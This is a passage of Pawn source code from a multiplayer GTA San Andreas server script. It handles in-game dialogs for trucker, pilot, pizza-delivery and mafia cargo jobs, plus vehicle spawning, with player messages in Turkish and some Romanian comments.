					case VehicleTrailerCargo, VehicleTrailerCargo2: // A cargo-trailer is attached
						ProductList = Product_GetList(PCV_TruckerCargoTrailer, NumProducts); // Build a list of products defined for truckers with a cargo-trailer
					case VehicleTrailerOre: // An Ore-trailer is attached
						ProductList = Product_GetList(PCV_TruckerOreTrailer, NumProducts); // Build a list of products defined for truckers with an ore-trailer
					case VehicleTrailerFluids: // A fluids-trailer is attached
						ProductList = Product_GetList(PCV_TruckerFluidsTrailer, NumProducts); // Build a list of products defined for truckers with a fluids-trailer
				}
			}
		}

		// Build the List with product-names
		for (new i; i < NumProducts; i++)
			format(TotalLoadList, 1000, "%s%s\n", TotalLoadList, ALoads[ProductList[i]][LoadName]);

		// Let the player choose a load
		ShowPlayerDialog(playerid, DialogTruckerSelectLoad, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectLoad, TotalLoadList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
		return 1;
	}

	// Get the LoadID that's stored in the player's account
	ProductID = APlayerData[playerid][LoadID];
	// Store the chosen start-location in the player's account
	APlayerData[playerid][JobLoc1] = ALoads[ProductID][FromLocations][listitem];

	// Build a list of end-locations for this product
	for (new i; i < 30; i++)
	{
	    // Get the location-id
	    LocID = ALoads[ProductID][ToLocations][i];
	    // Check if it a valid location-id (not 0)
	    if (LocID != 0)
			format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
		else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
	}

	// Ask the player to choose an end-location
	ShowPlayerDialog(playerid, DialogTruckerEndLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation

	return 1;
}



// Process the selected endlocation and start the job
Dialog_TruckerSelectEndLoc(playerid, response, listitem)
{
    // Setup local variables
	new loadName[50], startlocName[50], endlocName[50], LoadMsg[128], Float:x, Float:y, Float:z, ProductID, TotalStartLocList[1000], LocID;

	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		ProductID = APlayerData[playerid][LoadID];

		// Build a list of start-locations for this product
		for (new i; i < 30; i++)
		{
	    	// Get the location-id
	    	LocID = ALoads[ProductID][FromLocations][i];
	    	// Check if it a valid location-id (not 0)
	    	if (LocID != 0)
				format(TotalStartLocList, 1000, "%s%s\n", TotalStartLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
			else
		    	break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
		}

		// Ask the player to choose a start-location
		ShowPlayerDialog(playerid, DialogTruckerStartLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectStartLoc, TotalStartLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a starting location
 		return 1;
	}

	// Get the LoadID that's stored in the player's account
	ProductID = APlayerData[playerid][LoadID];
	// Store the chosen end-location in the player's account
	APlayerData[playerid][JobLoc2] = ALoads[ProductID][ToLocations][listitem];

	// Anti Kýsa Mesafe
	/*new Float:Mesafe, Float:xcarpim, Float:ycarpim, Float:zcarpim;
	xcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]) * (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]);
	ycarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]) * (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]);
	zcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]) * (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]);
	*/
	/*Mesafe = floatsqroot(xcarpim + ycarpim + zcarpim);

	if(Mesafe < 1500.0)
	{
		new TotalEndLocList[1000];

		for (new i; i < 30; i++)
		{
	    	LocID = ALoads[ProductID][ToLocations][i];
	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]);
			else
		    	break;
		}

		ShowPlayerDialog(playerid, DialogTruckerEndLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

		SendClientMessage(playerid, -1, "{FF0000}Baþlangýç ve bitiþ noktasý arasý mesafe en az 1500 metre olmalýdýr!");
	    return 1;
	}*/

	if(APlayerData[playerid][JobLoc1] == APlayerData[playerid][JobLoc2])
	{
		new TotalEndLocList[1000];

		for (new i; i < 30; i++)
		{
	    	LocID = ALoads[ProductID][ToLocations][i];
	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]);
			else
		    	break;
		}

		ShowPlayerDialog(playerid, DialogTruckerEndLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

		SendClientMessage(playerid, -1, "{FF0000}Yükleme ve boþaltma noktalarý ayný olamaz!");
	    return 1;
	}

	if(SonGorev[playerid][0] == APlayerData[playerid][JobLoc1] && SonGorev[playerid][1] == APlayerData[playerid][JobLoc2])
	{
		new TotalEndLocList[1000];

		for (new i; i < 30; i++)
		{
	    	LocID = ALoads[ProductID][ToLocations][i];
	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]);
			else
		    	break;
		}

		ShowPlayerDialog(playerid, DialogTruckerEndLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

		SendClientMessage(playerid, -1, "{FF0000}Ayný görevi üst üste iki kere yapamazsýnýz!");
	    return 1;
	}

    // Get the names for the load, startlocation and endlocation
	format(loadName, 50, "%s", ALoads[ProductID][LoadName]);
	format(startlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
	format(endlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc2]][LocationName]);

	// Job has started
	APlayerData[playerid][JobStarted] = true;
	// Store the vehicleID (required to be able to check if the player left his vehicle)
	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
	// Store the trailerID (required to be able to check if the player lost his trailer)
	APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));
	// Set jobstep to 1 (going to load the goods)
	APlayerData[playerid][JobStep] = 1;
	// Grab the x, y, z positions for the first location
	x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
	y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
	z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];
	// Create a checkpoint where the player should load the goods
	SetPlayerCheckpoint(playerid, x, y, z, 7);
	// Set the job-fail-time for the global vehicle-timer
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
	// Inform the player that he must load his goods
	format(LoadMsg, 128, TXT_PickupCargoAt, loadName, startlocName);
	SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);

	return 1;
}

/////////////////////////////////////////////////sfirsit licenta///////////////////////////////////////////////////////////////////////
//Licenta pilot

////////////////////////////////////////////////////////////

Dialog_PilotSelectJobMethod(playerid, response, listitem)

{

	// Setup local variables

	new ProductList[50], NumProducts, TotalLoadList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Select what to do after the player chose "Select your own load" or "Auto assigned load"

	switch (listitem)

	{

		case 0: // Let the player choose his own load

		{

			if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleShamal || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleNevada) // Check the vehicle-model of the player to decide which loads the player can carry
			{
				ProductList = Product_GetList(PCV_PilotPlane, NumProducts);
			}

			if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleMaverick || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleCargobob) // Check the vehicle-model of the player to decide which loads the player can carry
			{
				ProductList = Product_GetList(PCV_PilotHelicopter, NumProducts);
			}


			// Build the List with product-names

			for (new i; i < NumProducts; i++)

				format(TotalLoadList, 1000, "%s%s\n", TotalLoadList, ALoads[ProductList[i]][LoadName]);



			// Let the player choose a load

 			ShowPlayerDialog(playerid, DialogPilotSelectLoad, DIALOG_STYLE_LIST, TXT_PilotDialogSelectLoad, TotalLoadList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

		}



		case 1: {
			Pilot_StartRandomJob(playerid); // Start a random trucker-job
			PilotUcak[playerid] = GetPlayerVehicleID(playerid);
		}

	}



	return 1;

}

Dialog_PilotSelectLoad(playerid, response, listitem)

{

    // Setup local variables

	new TotalStartLocList[1000], ProductList[50], NumProducts, ProductID, LocID;



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// First get the list of products again, so we can retrieve the selected load from it
	if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleShamal || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleNevada) // Check the vehicle-model of the player to decide which loads the player can carry
	{
		ProductList = Product_GetList(PCV_PilotPlane, NumProducts);
	}

	if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleMaverick || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleCargobob) // Check the vehicle-model of the player to decide which loads the player can carry
	{
		ProductList = Product_GetList(PCV_PilotHelicopter, NumProducts);
	}

	// Store the selected LoadID in the player's account

	APlayerData[playerid][LoadID] = ProductList[listitem];

	ProductID = APlayerData[playerid][LoadID];



	// Build a list of start-locations for this product

	for (new i; i < 30; i++)

	{

	    // Get the location-id

	    LocID = ALoads[ProductID][FromLocations][i];

	    // Check if it a valid location-id (not 0)

	    if (LocID != 0)

			format(TotalStartLocList, 1000, "%s%s\n", TotalStartLocList, ALocations[LocID][LocationName]); // Add the location-name to the list

		else

		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list

	}



	// Ask the player to choose a start-location

	ShowPlayerDialog(playerid, DialogPilotStartLoc, DIALOG_STYLE_LIST, TXT_PilotDialogSelectStartLoc, TotalStartLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a starting location



	return 1;

}

Dialog_PilotSelectStartLoc(playerid, response, listitem)

{

    // Setup local variables

	new ProductID, LocID, TotalEndLocList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Get the LoadID that's stored in the player's account

	ProductID = APlayerData[playerid][LoadID];

	// Store the chosen start-location in the player's account

	APlayerData[playerid][JobLoc1] = ALoads[ProductID][FromLocations][listitem];



	// Build a list of end-locations for this product

	for (new i; i < 30; i++)

	{

	    // Get the location-id

	    LocID = ALoads[ProductID][ToLocations][i];

	    // Check if it a valid location-id (not 0)

	    if (LocID != 0)

			format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list

		else

		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list

	}



	// Ask the player to choose an end-location

	ShowPlayerDialog(playerid, DialogPilotEndLoc, DIALOG_STYLE_LIST, TXT_PilotDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation



	return 1;

}

Dialog_PilotSelectEndLoc(playerid, response, listitem)

{

    // Setup local variables

	new loadName[50], startlocName[50], endlocName[50], LoadMsg[128], Float:x, Float:y, Float:z, ProductID, LocID, TotalEndLocList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Get the LoadID that's stored in the player's account

	ProductID = APlayerData[playerid][LoadID];

	// Store the chosen end-location in the player's account

	APlayerData[playerid][JobLoc2] = ALoads[ProductID][ToLocations][listitem];

	if(APlayerData[playerid][JobLoc2] == APlayerData[playerid][JobLoc1])
	{
		// Build a list of end-locations for this product
		for (new i; i < 30; i++)
		{
	    	// Get the location-id
	    	LocID = ALoads[ProductID][ToLocations][i];

	    	// Check if it a valid location-id (not 0)

	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
			else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
		}

		// Ask the player to choose an end-location
		ShowPlayerDialog(playerid, DialogPilotEndLoc, DIALOG_STYLE_LIST, TXT_PilotDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation


		SendClientMessage(playerid, -1, "{FF0000}Yük alma ve býrakma noktalarý ayný olamaz!");
	    return 1;
	}

	// Anti Kýsa Mesafe
	new Float:Mesafe, Float:xcarpim, Float:ycarpim, Float:zcarpim;
	xcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]) * (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]);
	ycarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]) * (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]);
	zcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]) * (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]);

	Mesafe = floatsqroot(xcarpim + ycarpim + zcarpim);

	if(Mesafe < 1500.0)
	{
		// Build a list of end-locations for this product
		for (new i; i < 30; i++)
		{
	    	// Get the location-id
	    	LocID = ALoads[ProductID][ToLocations][i];

	    	// Check if it a valid location-id (not 0)

	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
			else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
		}

		// Ask the player to choose an end-location
		ShowPlayerDialog(playerid, DialogPilotEndLoc, DIALOG_STYLE_LIST, TXT_PilotDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation

		SendClientMessage(playerid, -1, "{FF0000}Baþlangýç ve bitiþ noktasý arasý mesafe en az 1500 metre olmalýdýr!");
	    return 1;
	}

    // Get the names for the load, startlocation and endlocation

	format(loadName, 50, "%s", ALoads[ProductID][LoadName]);

	format(startlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

	format(endlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc2]][LocationName]);



	// Job has started

	APlayerData[playerid][JobStarted] = true;
	
	PilotUcak[playerid] = GetPlayerVehicleID(playerid);

	// Store the vehicleID (required to be able to check if the player left his vehicle)

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);

	// Store the trailerID (required to be able to check if the player lost his trailer)

	APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));

	// Set jobstep to 1 (going to load the goods)

	APlayerData[playerid][JobStep] = 1;

	// Grab the x, y, z positions for the first location

	x = ALocations[APlayerData[playerid][JobLoc1]][LocX];

	y = ALocations[APlayerData[playerid][JobLoc1]][LocY];

	z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];

	// Create a checkpoint where the player should load the goods

	SetPlayerCheckpoint(playerid, x, y, z, 7);

	// Set the job-fail-time for the global vehicle-timer

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	// Inform the player that he must load his goods

	format(LoadMsg, 128, TXT_PickupCargoAt, loadName, startlocName);

	SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);



	return 1;

}

//pizza pby
// Process the chosen quantity for Pizza Boy job

Dialog_PboySelectQuant(playerid, response, listitem)

{

	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Listitem 0 represent maximum 2 houses to deliver a pizza, listitem 1 is max 5 houses, item 2 is max 10 houses

	switch (listitem)

	{

		case 0: APlayerData[playerid][PboyMaxStep] = 2;

		case 1: APlayerData[playerid][PboyMaxStep] = 5;

		case 2: APlayerData[playerid][PboyMaxStep] = 10;

	}



	// Start the job

	Pboy_BeginJob(playerid);



	return 1;

}
//////////////////////////////////////////Mafia license//////////////////////////////////
Dialog_MafiaSelectJobMethod(playerid, response, listitem)

{

	// Setup local variables

	new ProductList[50], NumProducts, TotalLoadList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Select what to do after the player chose "Select your own load" or "Auto assigned load"

	switch (listitem)

	{

		case 0: // Let the player choose his own load

		{

			if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleSandKing || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleMoonbeam) // Check the vehicle-model of the player to decide which loads the player can carry
			{
				ProductList = Product_GetList(PCV_MafiaVan, NumProducts);
			}


			// Build the List with product-names

			for (new i; i < NumProducts; i++)

				format(TotalLoadList, 1000, "%s%s\n", TotalLoadList, ALoads[ProductList[i]][LoadName]);



			// Let the player choose a load

 			ShowPlayerDialog(playerid, DialogMafiaSelectLoad, DIALOG_STYLE_LIST, TXT_MafiaDialogSelectLoad, TotalLoadList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

		}



		case 1: Mafia_StartRandomJob(playerid); // Start a random trucker-job

	}



	return 1;

}

Dialog_MafiaSelectLoad(playerid, response, listitem)

{

    // Setup local variables

	new TotalStartLocList[1000], ProductList[50], NumProducts, ProductID, LocID;



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// First get the list of products again, so we can retrieve the selected load from it
	if (GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleSandKing || GetVehicleModel(GetPlayerVehicleID(playerid)) == VehicleMoonbeam) // Check the vehicle-model of the player to decide which loads the player can carry
	{
		ProductList = Product_GetList(PCV_MafiaVan, NumProducts);
	}

	// Store the selected LoadID in the player's account

	APlayerData[playerid][LoadID] = ProductList[listitem];

	ProductID = APlayerData[playerid][LoadID];



	// Build a list of start-locations for this product

	for (new i; i < 30; i++)

	{

	    // Get the location-id

	    LocID = ALoads[ProductID][FromLocations][i];

	    // Check if it a valid location-id (not 0)

	    if (LocID != 0)

			format(TotalStartLocList, 1000, "%s%s\n", TotalStartLocList, ALocations[LocID][LocationName]); // Add the location-name to the list

		else

		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list

	}



	// Ask the player to choose a start-location

	ShowPlayerDialog(playerid, DialogMafiaStartLoc, DIALOG_STYLE_LIST, TXT_MafiaDialogSelectStartLoc, TotalStartLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a starting location



	return 1;

}

Dialog_MafiaSelectStartLoc(playerid, response, listitem)

{

    // Setup local variables

	new ProductID, LocID, TotalEndLocList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;



	// Get the LoadID that's stored in the player's account

	ProductID = APlayerData[playerid][LoadID];

	// Store the chosen start-location in the player's account

	APlayerData[playerid][JobLoc1] = ALoads[ProductID][FromLocations][listitem];



	// Build a list of end-locations for this product

	for (new i; i < 30; i++)

	{

	    // Get the location-id

	    LocID = ALoads[ProductID][ToLocations][i];

	    // Check if it a valid location-id (not 0)

	    if (LocID != 0)

			format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list

		else

		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list

	}



	// Ask the player to choose an end-location

	ShowPlayerDialog(playerid, DialogMafiaEndLoc, DIALOG_STYLE_LIST, TXT_MafiaDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation



	return 1;

}

Dialog_MafiaSelectEndLoc(playerid, response, listitem)

{

    // Setup local variables

	new loadName[50], startlocName[50], endlocName[50], LoadMsg[128], Float:x, Float:y, Float:z, ProductID, LocID, TotalEndLocList[1000];



	// Just close the dialog if the player clicked "Cancel"

	if(!response) return 1;


	// Get the LoadID that's stored in the player's account

	ProductID = APlayerData[playerid][LoadID];

	// Store the chosen end-location in the player's account

	APlayerData[playerid][JobLoc2] = ALoads[ProductID][ToLocations][listitem];

	if(APlayerData[playerid][JobLoc2] == APlayerData[playerid][JobLoc1])
	{
		// Build a list of end-locations for this product
		for (new i; i < 30; i++)
		{
	    	// Get the location-id
	    	LocID = ALoads[ProductID][ToLocations][i];

	    	// Check if it a valid location-id (not 0)

	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
			else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
		}

		// Ask the player to choose an end-location
		ShowPlayerDialog(playerid, DialogMafiaEndLoc, DIALOG_STYLE_LIST, TXT_MafiaDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation


		SendClientMessage(playerid, -1, "{FF0000}Yük alma ve býrakma noktalarý ayný olamaz!");
	    return 1;
	}

	// Anti Kýsa Mesafe
	new Float:Mesafe, Float:xcarpim, Float:ycarpim, Float:zcarpim;
	xcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]) * (ALocations[APlayerData[playerid][JobLoc1]][LocX]-ALocations[APlayerData[playerid][JobLoc2]][LocX]);
	ycarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]) * (ALocations[APlayerData[playerid][JobLoc1]][LocY]-ALocations[APlayerData[playerid][JobLoc2]][LocY]);
	zcarpim = (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]) * (ALocations[APlayerData[playerid][JobLoc1]][LocZ]-ALocations[APlayerData[playerid][JobLoc2]][LocZ]);

	Mesafe = floatsqroot(xcarpim + ycarpim + zcarpim);

	if(Mesafe < 1500.0)
	{
		// Build a list of end-locations for this product
		for (new i; i < 30; i++)
		{
	    	// Get the location-id
	    	LocID = ALoads[ProductID][ToLocations][i];

	    	// Check if it a valid location-id (not 0)

	    	if (LocID != 0)
				format(TotalEndLocList, 1000, "%s%s\n", TotalEndLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
			else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
		}

		// Ask the player to choose an end-location
		ShowPlayerDialog(playerid, DialogMafiaEndLoc, DIALOG_STYLE_LIST, TXT_MafiaDialogSelectEndLoc, TotalEndLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a endlocation

		SendClientMessage(playerid, -1, "{FF0000}Baþlangýç ve bitiþ noktasý arasý mesafe en az 1500 metre olmalýdýr!");
	    return 1;
	}

    // Get the names for the load, startlocation and endlocation

	format(loadName, 50, "%s", ALoads[ProductID][LoadName]);

	format(startlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc1]][LocationName]);

	format(endlocName, 50, "%s", ALocations[APlayerData[playerid][JobLoc2]][LocationName]);



	// Job has started

	APlayerData[playerid][JobStarted] = true;

	// Store the vehicleID (required to be able to check if the player left his vehicle)

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);

	// Store the trailerID (required to be able to check if the player lost his trailer)

	APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));

	// Set jobstep to 1 (going to load the goods)

	APlayerData[playerid][JobStep] = 1;

	// Grab the x, y, z positions for the first location

	x = ALocations[APlayerData[playerid][JobLoc1]][LocX];

	y = ALocations[APlayerData[playerid][JobLoc1]][LocY];

	z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];

	// Create a checkpoint where the player should load the goods

	SetPlayerCheckpoint(playerid, x, y, z, 7);

	// Set the job-fail-time for the global vehicle-timer

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	// Inform the player that he must load his goods

	format(LoadMsg, 128, TXT_PickupCargoAt, loadName, startlocName);

	SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);



	return 1;

}




// Process the bike dialog
Dialog_Bike(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Float:x, Float:y, Float:z, Float:rot, CarID, msg[120], vID, pName[24];
	new engine,lights,alarm,doors,bonnet,boot,objective;

	// Get the player's position and name
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, rot);
	GetPlayerName(playerid, pName, 24);

	// Spawn the motorcycle based on the selection in the list, and spawn it 5 units north of the player
	switch (listitem)
	{
		case 0: CarID = VehicleBike; // Bike
		case 1: CarID = VehicleBMX; // BMX
		case 2: CarID = VehicleMountainBike; // Mountain Bike
		case 3: CarID = VehicleFaggio; // Faggio
		case 4: CarID = VehiclePizzaBoy; // Pizzaboy
		case 5: CarID = VehicleBF400; // BF-400
		case 6: CarID = VehicleNRG500; // NRG-500
		case 7: CarID = VehiclePCJ600; // PCJ-600
		case 8: CarID = VehicleFCR900; // FCR-900
		case 9: CarID = VehicleFreeway; // Freeway
		case 10: CarID = VehicleWayfarer; // Wayfarer
		case 11: CarID = VehicleSanchez; // Sanchez
		case 12: CarID = VehicleQuad; // Quad
	}

	// Spawn the vehicle based on the selection in the list with a random color
	// Also set max-fuel and save the model for the vehicle
	vID = Vehicle_Create(CarID, x, y, z, rot, random(126), random(126), 600);
	// Put the player in the vehicle
	PutPlayerInVehicle(playerid, vID, 0);
	// Turn on the engine and lights
	GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vID, engine, 1, alarm, doors, bonnet, boot, objective);
	// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
	GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
	APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
	// Inform all players about it
	format(msg, 120, TXT_PlayerSpawnedVehicle, pName, vID, CarID, x, y, z);
	SendClientMessageToAll(0xFFFFFFFF, msg);

	return 1;
}



// Process the car dialog
Dialog_Car(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		// Reset the FirstCar (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogCarFirstCar] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 10: // Player chooses the empty line between the carlist and "Next...", so refresh the current list
		{
		    // Refresh the current list of cars and let the player choose one (show dialog)
		    CarList_Create(playerid);
			// Exit the function
			return 1;
		}
		case 11: // Player chooses "Next..."
		{
		    // Add 10 to the FirstCar, so the list will start further down the array (will show the next 10 cars)
		    APlayerData[playerid][DialogCarFirstCar] = APlayerData[playerid][DialogCarFirstCar] + 10;
		    // Create a new list of cars and show the dialog
		    CarList_Create(playerid);
		}
		default: // Player chooses a car
		{
		    // Setup local variables
	    	new Float:x, Float:y, Float:z, Float:rot, CarIndex, msg[128], vID, pName[24];
			new engine,lights,alarm,doors,bonnet,boot,objective;

			// FirstCar is the index of the first car in the list, so select the proper index when a car is chosen by the player
			CarIndex = APlayerData[playerid][DialogCarFirstCar] + listitem;

			// Get the player's position and name
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, rot);
			GetPlayerName(playerid, pName, 24);

   			if(APlayerData[playerid][PlayerLevel] < 5)
			{
			    new model = ACars[CarIndex][CarModel];
	    		if(model == 520 || model == 425 || model == 432 || model == 447 || model == 476) return SendClientMessage(playerid, -1, "{FF0000}Bu aracý indirmeye yetkiniz yok!");
			}

			// Spawn the vehicle based on the selection in the list with a random color
			// Also set max-fuel and save the model for the vehicle
			vID = Vehicle_Create(ACars[CarIndex][CarModel], x, y, z, rot, random(126), random(126), 600);

			// Put the player in the vehicle
			PutPlayerInVehicle(playerid, vID, 0);
			// Turn on the engine and lights
			GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vID, engine, 1, alarm, doors, bonnet, boot, objective);
			// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
			GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
			APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
			// Inform all players about it
			format(msg, 120, TXT_PlayerSpawnedVehicle, pName, vID, ACars[CarIndex][CarModel], x, y, z);
			SendClientMessageToAll(0xFFFFFFFF, msg);
			// Also, after spawning a vehicle, reset FirstCar (so next time, the list starts from the start)
			APlayerData[playerid][DialogCarFirstCar] = 0;
		}
	}

	return 1;
}



// Process the Plane dialog
Dialog_Plane(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		// Reset the FirstPlane (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogPlaneFirstPlane] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 10: // Player chooses the empty line between the Planelist and "Next...", so refresh the current list
		{
		    // Refresh the current list of Planes and let the player choose one (show dialog)
		    PlaneList_Create(playerid);
			// Exit the function
			return 1;
		}
		case 11: // Player chooses "Next..."
		{
		    // Add 10 to the FirstPlane, so the list will start further down the array (will show the next 10 Planes)
		    APlayerData[playerid][DialogPlaneFirstPlane] = APlayerData[playerid][DialogPlaneFirstPlane] + 10;
		    // Create a new list of Planes and show the dialog
